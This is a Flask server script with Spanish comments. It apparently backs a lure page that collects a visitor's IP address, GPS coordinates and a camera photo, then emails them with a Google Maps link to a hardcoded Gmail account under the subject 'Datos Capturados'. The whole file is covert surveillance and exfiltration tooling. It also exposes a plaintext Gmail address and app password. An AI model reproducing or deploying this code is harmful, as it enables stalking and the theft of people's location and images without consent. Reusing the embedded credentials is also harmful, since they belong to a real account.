from flask import Flask, request, render_template, jsonify
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import base64
import logging

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Configuración de Flask
app = Flask(__name__)

# Configuración Gmail  
EMAIL = "jesuscamelomejia9@gmail.com"  
PASSWORD = "whwdlmgmfgasxtzd"  
  

# Almacenamiento temporal de datos del cliente
datos_cliente = {
    "ip": None,
    "ubicacion": None,  # (lat, lon)
    "foto": None
}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['GET'])
def log():
    try:
        # Registrar IP o ubicación en el diccionario global
        ip = request.args.get('ip')
        lat = request.args.get('lat')
        lon = request.args.get('lon')

        if ip:
            datos_cliente["ip"] = ip
            logging.info(f"IP registrada: {ip}")

        if lat and lon:
            datos_cliente["ubicacion"] = (lat, lon)
            logging.info(f"Ubicación registrada: {lat}, {lon}")

        # Enviar correo si todos los datos están disponibles
        enviar_datos_si_estan_completos()
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logging.error(f"Error en /log: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload():
    try:
        # Obtener los datos JSON enviados por el cliente
        data = request.get_json()
        if not data or 'data' not in data:
            return jsonify({"error": "Solicitud inválida: falta 'data'"}), 400

        # Procesar la imagen base64
        foto = data['data'].split(',')[1]  # Extraer solo la parte base64
        filename = "foto.jpg"
        with open(filename, "wb") as f:
            f.write(base64.b64decode(foto))

        # Guardar la foto en el diccionario global
        datos_cliente["foto"] = filename
        logging.info("Foto recibida y almacenada correctamente.")

        # Enviar correo si todos los datos están disponibles
        enviar_datos_si_estan_completos()
        return jsonify({"status": "success"}), 200

    except Exception as e:
        logging.error(f"Error en /upload: {e}")
        return jsonify({"error": str(e)}), 500

def enviar_datos_si_estan_completos():
    """Envía un único correo cuando todos los datos están disponibles."""
    if datos_cliente["ip"] and datos_cliente["ubicacion"] and datos_cliente["foto"]:
        lat, lon = datos_cliente["ubicacion"]
        # Construir el mensaje con enlace a Google Maps
        google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        mensaje = f"""
        IP: {datos_cliente['ip']}
        Ubicación: {datos_cliente['ubicacion']}
        Enlace a Google Maps: {google_maps_link}
        """

        # Enviar el correo con la foto
        enviar_correo(mensaje, datos_cliente["foto"])

        # Limpiar los datos después de enviar el correo
        os.remove(datos_cliente["foto"])  # Eliminar el archivo temporal
        datos_cliente["ip"] = None
        datos_cliente["ubicacion"] = None
        datos_cliente["foto"] = None
        logging.info("Datos enviados por correo y limpiados correctamente.")

def enviar_correo(mensaje, archivo=None):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL
        msg['To'] = EMAIL
        msg['Subject'] = 'Alerta: Datos Capturados'

        msg.attach(MIMEText(mensaje, 'plain'))

        if archivo:
            with open(archivo, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename={archivo}',
                )
                msg.attach(part)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL, PASSWORD)
            server.sendmail(EMAIL, EMAIL, msg.as_string())
            logging.info("Correo enviado correctamente.")

    except Exception as e:
        logging.error(f"Error enviando el correo: {e}")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
